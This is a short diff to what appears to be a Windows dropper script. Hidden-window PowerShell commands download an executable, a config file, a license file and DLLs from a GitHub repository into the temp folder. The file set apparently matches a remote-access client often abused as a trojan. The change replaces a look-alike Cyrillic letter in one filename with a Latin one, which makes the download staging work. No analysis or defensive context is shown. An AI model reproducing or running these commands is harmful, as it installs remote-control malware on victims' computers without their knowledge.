@@ -1,5 +1,5 @@
 powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/client32.exe' -OutFile '%TEMP%\client32.exe';
-powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/MEMEOW-IO/test/refs/heads/main/client32.ini' -OutFile '%TEMP%\сlient32.ini';
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/MEMEOW-IO/test/refs/heads/main/client32.ini' -OutFile '%TEMP%\client32.ini';
 powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/NSM.LIC' -OutFile '%TEMP%\NSM.LIC';
 powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/HTCTL32.DLL' -OutFile '%TEMP%\HTCTL32.DLL';
 powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/msvcr100.dll' -OutFile '%TEMP%\msvcr100.dll';
